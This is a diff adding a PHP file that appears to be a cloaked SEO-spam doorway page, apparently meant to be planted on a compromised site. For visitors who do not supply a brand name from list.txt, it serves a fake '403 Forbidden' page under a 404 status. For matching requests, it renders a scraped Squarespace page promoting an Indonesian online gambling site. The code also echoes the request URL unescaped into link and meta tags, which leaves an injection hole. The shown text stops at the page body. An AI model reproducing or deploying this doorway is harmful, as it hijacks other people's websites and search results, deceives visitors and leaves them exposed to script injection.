+{
+    header("HTTP/1.0 404 Not Found");
+    echo "
+    <!DOCTYPE HTML PUBLIC '-//IETF//DTD HTML 2.0//EN'>
+    <html><head>
+    <title>403 Forbidden</title>
+    </head><body>
+    <h1>Forbidden</h1>
+    <p>You don't have permission to access this resource.</p>
+    <hr>
+    </body>
+    </html>
+    ";
+}
+
+if (isset($_GET['products'])) {
+    $filename = "list.txt";
+    $lines = file($filename, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+    $target_string = strtolower($_GET['products']);
+    foreach ($lines as $item) {
+        if (strtolower($item) === $target_string) {
+            $BRAND = strtoupper($target_string);
+        }
+    }
+    if (isset($BRAND)) {
+        $BRANDS = $BRAND;
+        $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
+        $fullUrl = $protocol . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
+        if (isset($fullUrl)) {
+            $parsedUrl = parse_url($fullUrl);
+            $scheme = isset($parsedUrl['scheme']) ? $parsedUrl['scheme'] : '';
+            $host = isset($parsedUrl['host']) ? $parsedUrl['host'] : '';
+            $path = isset($parsedUrl['path']) ? $parsedUrl['path'] : '';
+            $query = isset($parsedUrl['query']) ? $parsedUrl['query'] : '';
+            $baseUrl = $scheme . "://" . $host . $path . '?' . $query;
+            $urlPath = $baseUrl;
+        } else {
+            echo "";
+        }
+    } else {
+        feedback404();
+        exit();
+    }
+} else {
+    feedback404();
+    exit();
+}
+
+?>
+<!doctype html>
+<html xmlns:og="http://opengraphprotocol.org/schema/" xmlns:fb="http://www.facebook.com/2008/fbml" lang="en-US"  >
+  <head>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <!-- This is Squarespace. --><!-- smilodon-bobcat-grsw -->
+<base href="">
+<meta charset="utf-8" />
+<title><?php echo $BRANDS ?> Live Casino 🧞‍♂️ Situs Judi Online Terpercaya Di Indonesia </title>
+<meta http-equiv="Accept-CH" content="Sec-CH-UA-Platform-Version, Sec-CH-UA-Model" /><link rel="icon" type="image/x-icon" href="https://assets.squarespace.com/universal/default-favicon.ico"/>
+<link rel="canonical" href="<?php echo $urlPath ?>"/>
+<link rel="amphtml" href="https://moriahslot.pages.dev/">
+<meta property="og:site_name" content="Live Casino"/>
+<meta property="og:title" content="<?php echo $BRANDS ?> Live Casino 🧞‍♂️ Situs Judi Online Terpercaya Di Indonesia "/>
+<meta property="og:url" content="<?php echo $urlPath ?>"/>
+<meta property="og:type" content="product"/>
+<meta property="og:description" content="<?php echo $BRANDS ?> Live Casino 🧞‍♂️ adalah situs judi online terpercaya nomor 1 di indonesia resmi dan sudah mendapat lisensi resmi dari pagcor menjadi pilihan utama tahun 2024."/>
+<meta property="og:image" content="http://static1.squarespace.com/static/66407f51bb226442cd6da439/664218133d98d37de610c0e5/664218133d98d37de610c10e/1716625500328/Screenshot+2024-04-15+063415.png?format=1500w"/>
+<meta property="og:image:width" content="952"/>
+<meta property="og:image:height" content="649"/>
+<meta property="product:price:amount" content="25.00"/>
+<meta property="product:price:currency" content="IDR"/>
+<meta property="product:availability" content="instock"/>
+<meta itemprop="name" content="<?php echo $BRANDS ?> Live Casino 🧞‍♂️ Situs Judi Online Terpercaya Di Indonesia — Live Casino"/>
+<meta itemprop="url" content="<?php echo $urlPath ?>"/>
+<meta itemprop="description" content="<?php echo $BRANDS ?> Live Casino 🧞‍♂️ adalah situs judi online terpercaya nomor 1 di indonesia resmi dan sudah mendapat lisensi resmi dari pagcor menjadi pilihan utama tahun 2024."/>
+<meta itemprop="thumbnailUrl" content="http://static1.squarespace.com/static/66407f51bb226442cd6da439/664218133d98d37de610c0e5/664218133d98d37de610c10e/1716625500328/Screenshot+2024-04-15+063415.png?format=1500w"/>
+<link rel="image_src" href="http://static1.squarespace.com/static/66407f51bb226442cd6da439/664218133d98d37de610c0e5/664218133d98d37de610c10e/1716625500328/Screenshot+2024-04-15+063415.png?format=1500w" />
+<meta itemprop="image" content="http://static1.squarespace.com/static/66407f51bb226442cd6da439/664218133d98d37de610c0e5/664218133d98d37de610c10e/1716625500328/Screenshot+2024-04-15+063415.png?format=1500w"/>
+<meta name="twitter:title" content="<?php echo $BRANDS ?> Live Casino 🧞‍♂️ Situs Judi Online Terpercaya Di Indonesia — Live Casino"/>
+<meta name="twitter:image" content="http://static1.squarespace.com/static/66407f51bb226442cd6da439/664218133d98d37de610c0e5/664218133d98d37de610c10e/1716625500328/Screenshot+2024-04-15+063415.png?format=1500w"/>
+<meta name="twitter:url" content="<?php echo $urlPath ?>"/>
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:description" content="<?php echo $BRANDS ?> Live Casino 🧞‍♂️ adalah situs judi online terpercaya nomor 1 di indonesia resmi dan sudah mendapat lisensi resmi dari pagcor menjadi pilihan utama tahun 2024."/>
+<meta name="description" content="Live Casino 🧞‍♂️ adalah situs judi online terpercaya nomor 1 di indonesia 
+resmi dan sudah mendapat lisensi resmi dari pagcor menjadi pilihan utama 
+tahun 2024." />
+<link rel="preconnect" href="https://images.squarespace-cdn.com">
+<script type="text/javascript" src="//use.typekit.net/ik/BDFFchd9ZpeY73r_pATaUSBlAGk0T9iU-z1p-pMb4gJfeGtgfFHN4UJLFRbh52jhWDjhF2MaZR9UjcJkwRjXF24RZ2ZqjQbD5sGMJ6TyS14ypPuldhozJ6T0ZWSlSagTSc8XH6GJKiIfIMMjgfMfH6GJKNIfIMMjgkMfH6GJKlIfIMMj2KMfH6GJRFIfIMMjIPMfH6GJxpbfIMIjgPMfH6GJxrbfIMIjgkMfqMYQxGekg6.js"></script>
+<script type="text/javascript">try{Typekit.load();}catch(e){}</script>
+<script type="text/javascript" crossorigin="anonymous" defer="defer" nomodule="nomodule" src="//assets.squarespace.com/@sqs/polyfiller/1.6/legacy.js"></script>
+<script type="text/javascript" crossorigin="anonymous" defer="defer" src="//assets.squarespace.com/@sqs/polyfiller/1.6/modern.js"></script>
+<script type="text/javascript">SQUARESPACE_ROLLUPS = {};</script>
+<script>(function(rollups, name) { if (!rollups[name]) { rollups[name] = {}; } rollups[name].js = ["//assets.squarespace.com/universal/scripts-compressed/extract-css-runtime-4697672ae9ce5d6fceca-min.en-US.js"]; })(SQUARESPACE_ROLLUPS, 'squarespace-extract_css_runtime');</script>
+<script crossorigin="anonymous" src="//assets.squarespace.com/universal/scripts-compressed/extract-css-runtime-4697672ae9ce5d6fceca-min.en-US.js" defer ></script><script>(function(rollups, name) { if (!rollups[name]) { rollups[name] = {}; } rollups[name].js = ["//assets.squarespace.com/universal/scripts-compressed/extract-css-moment-js-vendor-6f117db4eb7fd4392375-min.en-US.js"]; })(SQUARESPACE_ROLLUPS, 'squarespace-extract_css_moment_js_vendor');</script>
+<script crossorigin="anonymous" src="//assets.squarespace.com/universal/scripts-compressed/extract-css-moment-js-vendor-6f117db4eb7fd4392375-min.en-US.js" defer ></script><script>(function(rollups, name) { if (!rollups[name]) { rollups[name] = {}; } rollups[name].js = ["//assets.squarespace.com/universal/scripts-compressed/cldr-resource-pack-e94539391642d3b99900-min.en-US.js"]; })(SQUARESPACE_ROLLUPS, 'squarespace-cldr_resource_pack');</script>
+<script crossorigin="anonymous" src="//assets.squarespace.com/universal/scripts-compressed/cldr-resource-pack-e94539391642d3b99900-min.en-US.js" defer ></script><script>(function(rollups, name) { if (!rollups[name]) { rollups[name] = {}; } rollups[name].js = ["//assets.squarespace.com/universal/scripts-compressed/common-vendors-stable-3598b219a3c023c1915a-min.en-US.js"]; })(SQUARESPACE_ROLLUPS, 'squarespace-common_vendors_stable');</script>
+<script crossorigin="anonymous" src="//assets.squarespace.com/universal/scripts-compressed/common-vendors-stable-3598b219a3c023c1915a-min.en-US.js" defer ></script><script>(function(rollups, name) { if (!rollups[name]) { rollups[name] = {}; } rollups[name].js = ["//assets.squarespace.com/universal/scripts-compressed/common-vendors-7713f46925f443840592-min.en-US.js"]; })(SQUARESPACE_ROLLUPS, 'squarespace-common_vendors');</script>
+<script crossorigin="anonymous" src="//assets.squarespace.com/universal/scripts-compressed/common-vendors-7713f46925f443840592-min.en-US.js" defer ></script><script>(function(rollups, name) { if (!rollups[name]) { rollups[name] = {}; } rollups[name].js = ["//assets.squarespace.com/universal/scripts-compressed/common-68a71b40a94572004203-min.en-US.js"]; })(SQUARESPACE_ROLLUPS, 'squarespace-common');</script>
+<script crossorigin="anonymous" src="//assets.squarespace.com/universal/scripts-compressed/common-68a71b40a94572004203-min.en-US.js" defer ></script><script>(function(rollups, name) { if (!rollups[name]) { rollups[name] = {}; } rollups[name].js = ["//assets.squarespace.com/universal/scripts-compressed/commerce-d7fb29abe11ed2a48d84-min.en-US.js"]; })(SQUARESPACE_ROLLUPS, 'squarespace-commerce');</script>
+<script crossorigin="anonymous" src="//assets.squarespace.com/universal/scripts-compressed/commerce-d7fb29abe11ed2a48d84-min.en-US.js" defer ></script><script>(function(rollups, name) { if (!rollups[name]) { rollups[name] = {}; } rollups[name].css = ["//assets.squarespace.com/universal/styles-compressed/commerce-2af06f7948db5477d8f5-min.en-US.css"]; })(SQUARESPACE_ROLLUPS, 'squarespace-commerce');</script>
+<link rel="stylesheet" type="text/css" href="//assets.squarespace.com/universal/styles-compressed/commerce-2af06f7948db5477d8f5-min.en-US.css"><script>(function(rollups, name) { if (!rollups[name]) { rollups[name] = {}; } rollups[name].js = ["//assets.squarespace.com/universal/scripts-compressed/user-account-core-3b0a596a87802bd001df-min.en-US.js"]; })(SQUARESPACE_ROLLUPS, 'squarespace-user_account_core');</script>
+<script crossorigin="anonymous" src="//assets.squarespace.com/universal/scripts-compressed/user-account-core-3b0a596a87802bd001df-min.en-US.js" defer ></script><script>(function(rollups, name) { if (!rollups[name]) { rollups[name] = {}; } rollups[name].css = ["//assets.squarespace.com/universal/styles-compressed/user-account-core-e84acd73aa5ee3fcd4ad-min.en-US.css"]; })(SQUARESPACE_ROLLUPS, 'squarespace-user_account_core');</script>
+<link rel="stylesheet" type="text/css" href="//assets.squarespace.com/universal/styles-compressed/user-account-core-e84acd73aa5ee3fcd4ad-min.en-US.css"><script>(function(rollups, name) { if (!rollups[name]) { rollups[name] = {}; } rollups[name].js = ["//assets.squarespace.com/universal/scripts-compressed/performance-b70b316548c4dbb3e0dd-min.en-US.js"]; })(SQUARESPACE_ROLLUPS, 'squarespace-performance');</script>
+<script crossorigin="anonymous" src="//assets.squarespace.com/universal/scripts-compressed/performance-b70b316548c4dbb3e0dd-min.en-US.js" defer ></script><script data-name="static-context">Static = window.Static || {}; Static.SQUARESPACE_CONTEXT = {"facebookAppId":"314192535267336","facebookApiVersion":"v6.0","rollups":{"squarespace-announcement-bar":{"js":"//assets.squarespace.com/universal/scripts-compressed/announcement-bar-f5e166398f68a61e662f-min.en-US.js"},"squarespace-audio-player":{"css":"//assets.squarespace.com/universal/styles-compressed/audio-player-9fb16b1675c0ff315dae-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/audio-player-1bf932b43965a7ee4fbb-min.en-US.js"},"squarespace-blog-collection-list":{"css":"//assets.squarespace.com/universal/styles-compressed/blog-collection-list-0106e2d3707028a62a85-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/blog-collection-list-bb0683614c41f8a11085-min.en-US.js"},"squarespace-calendar-block-renderer":{"css":"//assets.squarespace.com/universal/styles-compressed/calendar-block-renderer-0e361398b7723c9dc63e-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/calendar-block-renderer-90bf6109d7f9529faf8a-min.en-US.js"},"squarespace-chartjs-helpers":{"css":"//assets.squarespace.com/universal/styles-compressed/chartjs-helpers-e1c09c17d776634c0edc-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/chartjs-helpers-ae72e538cdd8d3806898-min.en-US.js"},"squarespace-comments":{"css":"//assets.squarespace.com/universal/styles-compressed/comments-24b74a0326eae0cd5049-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/comments-6a7d5c6470cfc1bf449f-min.en-US.js"},"squarespace-custom-css-popup":{"css":"//assets.squarespace.com/universal/styles-compressed/custom-css-popup-acff97d364814cf90bf6-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/custom-css-popup-626da53bae8e43761122-min.en-US.js"},"squarespace-dialog":{"css":"//assets.squarespace.com/universal/styles-compressed/dialog-9b4492115f756f38c490-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/dialog-437e3209202d2400e2c8-min.en-US.js"},"squarespace-events-collection":{"css":"//assets.squarespace.com/universal/styles-compressed/events-collection-0e361398b7723c9dc63e-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/events-collection-49534988d3b5a2f639b6-min.en-US.js"},"squarespace-form-rendering-utils":{"js":"//assets.squarespace.com/universal/scripts-compressed/form-rendering-utils-f82cb5776662cbbc4933-min.en-US.js"},"squarespace-forms":{"css":"//assets.squarespace.com/universal/styles-compressed/forms-8d93ba2c12ff0765b64c-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/forms-953994245c1347b8d72b-min.en-US.js"},"squarespace-gallery-collection-list":{"css":"//assets.squarespace.com/universal/styles-compressed/gallery-collection-list-0106e2d3707028a62a85-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/gallery-collection-list-64b8938cf9ce62400835-min.en-US.js"},"squarespace-image-zoom":{"css":"//assets.squarespace.com/universal/styles-compressed/image-zoom-0106e2d3707028a62a85-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/image-zoom-84d849c1eade7a08d59e-min.en-US.js"},"squarespace-pinterest":{"css":"//assets.squarespace.com/universal/styles-compressed/pinterest-0106e2d3707028a62a85-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/pinterest-1d74306ec409d6fbfb22-min.en-US.js"},"squarespace-popup-overlay":{"css":"//assets.squarespace.com/universal/styles-compressed/popup-overlay-b2bf7df4402e207cd72c-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/popup-overlay-3fc66fb91506f355347a-min.en-US.js"},"squarespace-product-quick-view":{"css":"//assets.squarespace.com/universal/styles-compressed/product-quick-view-4aec27f1bd826750e9db-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/product-quick-view-a2914e770206bcf41929-min.en-US.js"},"squarespace-products-collection-item-v2":{"css":"//assets.squarespace.com/universal/styles-compressed/products-collection-item-v2-0106e2d3707028a62a85-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/products-collection-item-v2-fc4cdbcf05cd6cd955d4-min.en-US.js"},"squarespace-products-collection-list-v2":{"css":"//assets.squarespace.com/universal/styles-compressed/products-collection-list-v2-0106e2d3707028a62a85-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/products-collection-list-v2-b9efee358f56ea8bf33b-min.en-US.js"},"squarespace-search-page":{"css":"//assets.squarespace.com/universal/styles-compressed/search-page-dcc0462e30efbd6dc562-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/search-page-d336028d4348f1d434c0-min.en-US.js"},"squarespace-search-preview":{"js":"//assets.squarespace.com/universal/scripts-compressed/search-preview-e3879c51c34296ea6199-min.en-US.js"},"squarespace-simple-liking":{"css":"//assets.squarespace.com/universal/styles-compressed/simple-liking-a9eb87c1b73b199ce387-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/simple-liking-177101dab03c3e13f3eb-min.en-US.js"},"squarespace-social-buttons":{"css":"//assets.squarespace.com/universal/styles-compressed/social-buttons-98ee3a678d356d849b76-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/social-buttons-d792c7df445248333ed8-min.en-US.js"},"squarespace-tourdates":{"css":"//assets.squarespace.com/universal/styles-compressed/tourdates-0106e2d3707028a62a85-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/tourdates-e26e971ffd0d3a7d6f4f-min.en-US.js"},"squarespace-website-overlays-manager":{"css":"//assets.squarespace.com/universal/styles-compressed/website-overlays-manager-6dfb472f441e39d78b13-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/website-overlays-manager-b95dcd45aaf3d48318ac-min.en-US.js"}},"pageType":50,"website":{"id":"66407f51bb226442cd6da439","identifier":"smilodon-bobcat-grsw","websiteType":1,"contentModifiedOn":1716625499135,"cloneable":false,"hasBeenCloneable":false,"siteStatus":{},"language":"en-US","timeZone":"Asia/Phnom_Penh","machineTimeZoneOffset":25200000,"timeZoneOffset":25200000,"timeZoneAbbr":"ICT","siteTitle":"Live Casino","fullSiteTitle":"Live Casino \uD83E\uDDDE\u200D\u2642\uFE0F Situs Judi Online Terpercaya Di Indonesia \u2014 Live Casino","siteDescription":"","shareButtonOptions":{"6":true,"3":true,"1":true,"2":true,"8":true,"7":true,"4":true},"authenticUrl":"https://smilodon-bobcat-grsw.squarespace.com","internalUrl":"https://smilodon-bobcat-grsw.squarespace.com","baseUrl":"https://smilodon-bobcat-grsw.squarespace.com","sslSetting":3,"isHstsEnabled":true,"typekitId":"","statsMigrated":false,"imageMetadataProcessingEnabled":false,"captchaSettings":{"enabledForDonations":false},"showOwnerLogin":false},"websiteSettings":{"id":"66407f51bb226442cd6da43b","websiteId":"66407f51bb226442cd6da439","subjects":[],"country":"KH","state":"12","simpleLikingEnabled":true,"mobileInfoBarSettings":{"isContactEmailEnabled":false,"isContactPhoneNumberEnabled":false,"isLocationEnabled":false,"isBusinessHoursEnabled":false},"commentLikesAllowed":true,"commentAnonAllowed":true,"commentThreaded":true,"commentApprovalRequired":false,"commentAvatarsOn":true,"commentSortType":2,"commentFlagThreshold":0,"commentFlagsAllowed":true,"commentEnableByDefault":true,"commentDisableAfterDaysDefault":0,"disqusShortname":"","commentsEnabled":false,"storeSettings":{"returnPolicy":null,"termsOfService":null,"privacyPolicy":null,"expressCheckout":false,"continueShoppingLinkUrl":"/","useLightCart":false,"showNoteField":false,"shippingCountryDefaultValue":"US","billToShippingDefaultValue":false,"showShippingPhoneNumber":true,"isShippingPhoneRequired":false,"showBillingPhoneNumber":true,"isBillingPhoneRequired":false,"currenciesSupported":["IDR","CAD","GBP","AUD","EUR","CHF","NOK","SEK","DKK","NZD","SGD","MXN","HKD","CZK","ILS","MYR","RUB","PHP","PLN","THB","BRL","ARS","COP","IDR","INR","JPY","ZAR"],"defaultCurrency":"IDR","selectedCurrency":"IDR","measurementStandard":1,"showCustomCheckoutForm":false,"checkoutPageMarketingOptInEnabled":true,"enableMailingListOptInByDefault":false,"sameAsRetailLocation":false,"merchandisingSettings":{"scarcityEnabledOnProductItems":false,"scarcityEnabledOnProductBlocks":false,"scarcityMessageType":"DEFAULT_SCARCITY_MESSAGE","scarcityThreshold":10,"multipleQuantityAllowedForServices":false,"restockNotificationsEnabled":false,"restockNotificationsMailingListSignUpEnabled":false,"relatedProductsEnabled":true,"relatedProductsOrdering":"random","customSoldOutText":"Sold Out","soldOutVariantsDropdownDisabled":false,"productComposerOptedIn":false,"productComposerABTestOptedOut":false,"productReviewsEnabled":false,"displayNativeProductReviewsEnabled":false,"displayImportedProductReviewsEnabled":false,"productReviewsDisplayScope":"ALL_REVIEWS","productReviewsMerchantEmailEnabled":false,"hasOptedToCollectNativeReviews":false},"minimumOrderSubtotalEnabled":false,"minimumOrderSubtotal":{"currency":"IDR","value":"0.00"},"isLive":false,"multipleQuantityAllowedForServices":false},"useEscapeKeyToLogin":false,"ssBadgeType":1,"ssBadgePosition":4,"ssBadgeVisibility":1,"ssBadgeDevices":1,"pinterestOverlayOptions":{"mode":"disabled"},"ampEnabled":false,"userAccountsSettings":{"loginAllowed":true,"signupAllowed":true}},"cookieSettings":{"isCookieBannerEnabled":false,"isRestrictiveCookiePolicyEnabled":false,"isRestrictiveCookiePolicyAbsolute":false,"cookieBannerText":"","cookieBannerTheme":"","cookieBannerVariant":"","cookieBannerPosition":"","cookieBannerCtaVariant":"","cookieBannerCtaText":"","cookieBannerAcceptType":"OPT_IN","cookieBannerOptOutCtaText":"","cookieBannerHasOptOut":false,"cookieBannerHasManageCookies":true,"cookieBannerManageCookiesLabel":""},"websiteCloneable":false,"collection":{"title":"Store 2","id":"664218133d98d37de610c0e5","fullUrl":"/store-2","type":13,"permissionType":1},"item":{"title":"Live Casino \uD83E\uDDDE\u200D\u2642\uFE0F Situs Judi Online Terpercaya Di Indonesia","id":"664218133d98d37de610c10e","fullUrl":"/store-2/p/golden-mist-cup-weny8-gfw52","publicCommentCount":0,"commentState":1,"recordType":11},"subscribed":false,"appDomain":"squarespace.com","templateTweakable":true,"tweakJSON":{"form-use-theme-colors":"false","header-logo-height":"50px","header-mobile-logo-max-height":"30px","header-vert-padding":"1vw","header-width":"Inset","maxPageWidth":"1800px","pagePadding":"2vw","tweak-blog-alternating-side-by-side-image-aspect-ratio":"1:1 Square","tweak-blog-alternating-side-by-side-image-spacing":"6%","tweak-blog-alternating-side-by-side-meta-spacing":"20px","tweak-blog-alternating-side-by-side-primary-meta":"Categories","tweak-blog-alternating-side-by-side-read-more-spacing":"20px","tweak-blog-alternating-side-by-side-secondary-meta":"Date","tweak-blog-basic-grid-columns":"3","tweak-blog-basic-grid-image-aspect-ratio":"4:3 Four-Three","tweak-blog-basic-grid-image-spacing":"10px","tweak-blog-basic-grid-meta-spacing":"3px","tweak-blog-basic-grid-primary-meta":"Date","tweak-blog-basic-grid-read-more-spacing":"5px","tweak-blog-basic-grid-secondary-meta":"Categories","tweak-blog-item-custom-width":"50","tweak-blog-item-show-author-profile":"false","tweak-blog-item-width":"Narrow","tweak-blog-masonry-columns":"3","tweak-blog-masonry-horizontal-spacing":"75px","tweak-blog-masonry-image-spacing":"18px","tweak-blog-masonry-meta-spacing":"10px","tweak-blog-masonry-primary-meta":"Categories","tweak-blog-masonry-read-more-spacing":"5px","tweak-blog-masonry-secondary-meta":"Date","tweak-blog-masonry-vertical-spacing":"80px","tweak-blog-side-by-side-image-aspect-ratio":"1:1 Square","tweak-blog-side-by-side-image-spacing":"6%","tweak-blog-side-by-side-meta-spacing":"20px","tweak-blog-side-by-side-primary-meta":"Categories","tweak-blog-side-by-side-read-more-spacing":"20px","tweak-blog-side-by-side-secondary-meta":"Date","tweak-blog-single-column-image-spacing":"50px","tweak-blog-single-column-meta-spacing":"30px","tweak-blog-single-column-primary-meta":"None","tweak-blog-single-column-read-more-spacing":"30px","tweak-blog-single-column-secondary-meta":"None","tweak-events-stacked-show-thumbnails":"true","tweak-events-stacked-thumbnail-size":"3:2 Standard","tweak-fixed-header":"true","tweak-fixed-header-style":"Basic","tweak-global-animations-animation-curve":"ease","tweak-global-animations-animation-delay":"0.6s","tweak-global-animations-animation-duration":"0.90s","tweak-global-animations-animation-style":"fade","tweak-global-animations-animation-type":"fade","tweak-global-animations-complexity-level":"detailed","tweak-global-animations-enabled":"true","tweak-portfolio-grid-basic-custom-height":"50","tweak-portfolio-grid-overlay-custom-height":"50","tweak-portfolio-hover-follow-acceleration":"10%","tweak-portfolio-hover-follow-animation-duration":"Medium","tweak-portfolio-hover-follow-animation-type":"Fade","tweak-portfolio-hover-follow-delimiter":"Forward Slash","tweak-portfolio-hover-follow-front":"false","tweak-portfolio-hover-follow-layout":"Inline","tweak-portfolio-hover-follow-size":"75","tweak-portfolio-hover-follow-text-spacing-x":"1.5","tweak-portfolio-hover-follow-text-spacing-y":"1.5","tweak-portfolio-hover-static-animation-duration":"Medium","tweak-portfolio-hover-static-animation-type":"Scale Up","tweak-portfolio-hover-static-delimiter":"Forward Slash","tweak-portfolio-hover-static-front":"false","tweak-portfolio-hover-static-layout":"Stacked","tweak-portfolio-hover-static-size":"75","tweak-portfolio-hover-static-text-spacing-x":"1.5","tweak-portfolio-hover-static-text-spacing-y":"1.5","tweak-portfolio-index-background-animation-duration":"Medium","tweak-portfolio-index-background-animation-type":"Fade","tweak-portfolio-index-background-custom-height":"50","tweak-portfolio-index-background-delimiter":"None","tweak-portfolio-index-background-height":"Large","tweak-portfolio-index-background-horizontal-alignment":"Center","tweak-portfolio-index-background-link-format":"Stacked","tweak-portfolio-index-background-persist":"false","tweak-portfolio-index-background-vertical-alignment":"Middle","tweak-portfolio-index-background-width":"Full","tweak-product-basic-item-click-action":"None","tweak-product-basic-item-gallery-aspect-ratio":"3:2 Standard","tweak-product-basic-item-gallery-design":"Stacked","tweak-product-basic-item-gallery-width":"48%","tweak-product-basic-item-hover-action":"None","tweak-product-basic-item-image-spacing":"3vw","tweak-product-basic-item-image-zoom-factor":"1.75","tweak-product-basic-item-product-variant-display":"Dropdown","tweak-product-basic-item-thumbnail-placement":"Side","tweak-product-basic-item-variant-picker-layout":"Dropdowns","tweak-products-add-to-cart-button":"false","tweak-products-columns":"3","tweak-products-gutter-column":"2.5vw","tweak-products-gutter-row":"4vw","tweak-products-header-text-alignment":"Left","tweak-products-image-aspect-ratio":"3:2 Standard","tweak-products-image-text-spacing":"0.5vw","tweak-products-mobile-columns":"1","tweak-products-text-alignment":"Middle","tweak-products-width":"Inset","tweak-transparent-header":"true"},"templateId":"5c5a519771c10ba3470d8101","templateVersion":"7.1","pageFeatures":[1,2,4],"gmRenderKey":"QUl6YVN5Q0JUUk9xNkx1dkZfSUUxcjQ2LVQ0QWVUU1YtMGQ3bXk4","templateScriptsRootUrl":"https://static1.squarespace.com/static/vta/5c5a519771c10ba3470d8101/scripts/","betaFeatureFlags":["visitor_react_forms","campaigns_discount_section_in_blasts","scripts_defer","unify_edit_mode_p2","send_local_pickup_ready_email","commerce_paywall_renewal_notifications","hideable_header_footer_for_memberareas","fluid_engine_clean_up_grid_contextual_change","pdp_subs_otp_buttons","supports_versioned_template_assets","commerce_etsy_shipping_import","campaigns_global_uc_ab","is_feature_gate_refresh_enabled","enable_css_variable_tweaks","collection_typename_switching","customer_account_creation_recaptcha","accounting_orders_sync","digital_products_personal_plan_access","commerce_clearpay","themes","override_block_styles","i18n_beta_website_locales","crm_product_contacts_use_mfe","marketing_landing_page","new_stacked_index","pdp_subs_otp_visitor_site","hideable_header_footer_for_courses","nested_categories","commerce_site_visitor_metrics","proposals_ga","campaigns_import_discounts","hide_header_footer_beta","fluid_engine","commerce_order_status_access","commerce_subscription_renewal_notifications","customer_accounts_email_verification","nested_categories_migration_enabled","campaigns_new_image_layout_picker","member_areas_feature","campaigns_thumbnail_layout","commerce_etsy_product_import","hideable_header_footer_for_videos","google_consent_v2","crm_redesign_phase_1","campaigns_discount_section_in_automations","background_art_onboarding","toggle_preview_new_shortcut","website_fonts","hideable_header_footer","commsplat_forms_visitor_profile"],"videoAssetsFeatureFlags":["mux-data-video-collection","mux-data-course-collection"],"impersonatedSession":false,"demoCollections":[{"collectionId":"624b50507ea85a384b51716e","deleted":false},{"collectionId":"624b503b7ea85a384b516ab2","deleted":false},{"collectionId":"624b503f7ea85a384b516c8e","deleted":false},{"collectionId":"624b50447ea85a384b516dc1","deleted":false},{"collectionId":"624b50467ea85a384b516e5f","deleted":false},{"collectionId":"624b504c7ea85a384b517071","deleted":false},{"collectionId":"624b504a7ea85a384b516f53","deleted":false},{"collectionId":"624b503f7ea85a384b516c82","deleted":false}],"tzData":{"zones":[[420,null,"+07",null]],"rules":{}},"product":{"variantAttributeNames":[],"variants":[{"id":"0da0c82a-f04d-441e-a16c-0aec3a33f21e","sku":"SQ5564731","price":{"currencyCode":"USD","value":2500,"decimalValue":"25.00","fractionalDigits":2},"salePrice":{"currencyCode":"USD","value":0,"decimalValue":"0.00","fractionalDigits":2},"onSale":false,"stock":{"unlimited":true},"attributes":{},"shippingWeight":{"value":0.0,"unit":"POUND"},"shippingSize":{"unit":"INCH","width":0.0,"height":0.0,"len":0.0}}],"subscribable":false,"fulfilledExternally":false,"productType":1},"showAnnouncementBar":false,"recaptchaEnterpriseContext":{"recaptchaEnterpriseSiteKey":"6LdDFQwjAAAAAPigEvvPgEVbb7QBm-TkVJdDTlAv"},"i18nContext":{"timeZoneData":{"id":"Asia/Bangkok","name":"Indochina Time"}},"env":"PRODUCTION"};</script><script type="application/ld+json">{"url":"https://smilodon-bobcat-grsw.squarespace.com","name":"Live Casino","description":"","@context":"http://schema.org","@type":"WebSite"}</script><script type="application/ld+json">{"name":"Live Casino \uD83E\uDDDE\u200D\u2642\uFE0F Situs Judi Online Terpercaya Di Indonesia \u2014 Live Casino","image":"http://static1.squarespace.com/static/66407f51bb226442cd6da439/664218133d98d37de610c0e5/664218133d98d37de610c10e/1716625500328/Screenshot+2024-04-15+063415.png?format=1500w","description":"Live Casino \uD83E\uDDDE\u200D\u2642\uFE0F adalah situs judi online terpercaya nomor 1 di indonesia resmi dan sudah mendapat lisensi resmi dari pagcor menjadi pilihan utama tahun 2024.","brand":"Live Casino","offers":{"price":25.00,"priceCurrency":"USD","url":"<?php echo $urlPath ?>","availability":"InStock","sku":"SQ5564731","@context":"http://schema.org","@type":"Offer"},"@context":"http://schema.org","@type":"Product"}</script><link rel="stylesheet" type="text/css" href="https://static1.squarespace.com/static/versioned-site-css/66407f51bb226442cd6da439/1/5c5a519771c10ba3470d8101/66407f52bb226442cd6da440/1527/site.css"/><script>Static.COOKIE_BANNER_CAPABLE = true;</script>
+<!-- End of Squarespace Headers -->
+    
+      <link rel="stylesheet" type="text/css" href="https://static1.squarespace.com/static/vta/5c5a519771c10ba3470d8101/versioned-assets/1716308142457-NTLQBPORVVYGYH5NWZVQ/static.css">
+    
+  </head>
+
+  <body
+    id="item-664218133d98d37de610c10e"
+    class="
